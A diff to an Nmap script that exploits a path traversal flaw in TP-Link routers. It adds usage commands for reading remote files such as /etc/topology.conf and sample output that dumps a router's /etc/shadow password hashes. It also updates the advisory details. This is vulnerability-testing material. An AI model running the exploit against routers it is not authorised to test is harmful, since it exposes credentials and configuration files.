@@ -3,9 +3,43 @@ Exploits a directory traversal vulnerability existing in several TP-Link wireles
 ]]
 
 ---
--- @usage
---
+-- @usage nmap -p80 --script http-tplink-dir-traversal.nse <target>
+-- @usage nmap -p80 -Pn -n --script http-tplink-dir-traversal.nse <target>
+-- @usage nmap -p80 --script http-tplink-dir-traversal.nse --script-args rfile=/etc/topology.conf -d -n -Pn
+
+-- 
 -- @output
+-- PORT   STATE SERVICE REASON
+-- 80/tcp open  http    syn-ack
+-- | http-tplink-dir-traversal: 
+-- |   VULNERABLE:
+-- |   Path traversal vulnerability in several TP-Link wireless routers
+-- |     State: VULNERABLE (Exploitable)
+-- |     Description:
+-- |       Some TP-Link wireless routers are vulnerable to a path traversal vulnerability that allows attackers to read configurations or any other file in the device.
+-- |       This vulnerability can be exploited without authenticatication.
+-- |       Confirmed vulnerable models: WR740N, WR740ND
+-- |       Possibly vulnerable: WR743ND,WR842ND,WA-901ND,WR941N,WR941ND,WR1043ND,WR2543ND,MR3220,MR3020,WR841N.
+-- |     Disclosure date: 2012-06-18
+-- |     Extra information:
+-- |       /etc/shadow :
+-- |   
+-- |   root:$1$$zdlNHiCDxYDfeF4MZL.H3/:10933:0:99999:7:::
+-- |   Admin:$1$$zdlNHiCDxYDfeF4MZL.H3/:10933:0:99999:7:::
+-- |   bin::10933:0:99999:7:::
+-- |   daemon::10933:0:99999:7:::
+-- |   adm::10933:0:99999:7:::
+-- |   lp:*:10933:0:99999:7:::
+-- |   sync:*:10933:0:99999:7:::
+-- |   shutdown:*:10933:0:99999:7:::
+-- |   halt:*:10933:0:99999:7:::
+-- |   uucp:*:10933:0:99999:7:::
+-- |   operator:*:10933:0:99999:7:::
+-- |   nobody::10933:0:99999:7:::
+-- |   ap71::10933:0:99999:7:::
+-- |   
+-- |     References:
+-- |_      http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740
 --
 -- @args http-tplink-dir-traversal.rfile Remote file to download. Default: /etc/passwd
 -- @args http-tplink-dir-traversal.outfile If set it saves the remote file to this location.
@@ -14,7 +48,7 @@ Exploits a directory traversal vulnerability existing in several TP-Link wireles
 -- * http.useragent - Sets user agent
 -- 
 
-author = "Paulino Calderon"
+author = "Paulino Calderon <calderon()websec.mx>"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
 categories = {"vuln", "exploit"}
 
@@ -68,16 +102,18 @@ action = function(host, port)
   rfile = stdnse.get_script_args(SCRIPT_NAME..".rfile") or DEFAULT_REMOTE_FILE
 
   local vuln = {
-       title = 'Path traversal in TP-Link WR740 and possibly others',
+       title = 'Path traversal vulnerability in several TP-Link wireless routers',
        state = vulns.STATE.NOT_VULN, 
        description = [[
-TP-Link WR740 and possibly others are vulnerable to a path traversal vulnerability in the URI "/help".
-This vulnerability can be exploited without authentication and gives attackers access to any file in the device including configuration files.]],
+Some TP-Link wireless routers are vulnerable to a path traversal vulnerability that allows attackers to read configurations or any other file in the device.
+This vulnerability can be exploited without authenticatication.
+Confirmed vulnerable models: WR740N, WR740ND
+Possibly vulnerable: WR743ND,WR842ND,WA-901ND,WR941N,WR941ND,WR1043ND,WR2543ND,MR3220,MR3020,WR841N.]],
        references = {
-           'http://websec.ca/advisories/'
+           'http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740'
        },
        dates = {
-           disclosure = {year = '2012', month = '01', day = '1'},
+           disclosure = {year = '2012', month = '06', day = '18'},
        },
   }
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
@@ -87,7 +123,7 @@ This vulnerability can be exploited without authentication and gives attackers a
     vuln.state = vulns.STATE.EXPLOIT
     response = http.get(host, port, TRAVERSAL_QRY..rfile)
     if response.body and response.status==200 then
-      stdnse.print_debug(1, "%s", response.body)
+      stdnse.print_debug(2, "%s", response.body)
       if response.body:match("Error") then
         stdnse.print_debug(1, "%s:[Error] File not found:%s", SCRIPT_NAME, rfile)
         vuln.extra_info = string.format("%s not found.\n", rfile)
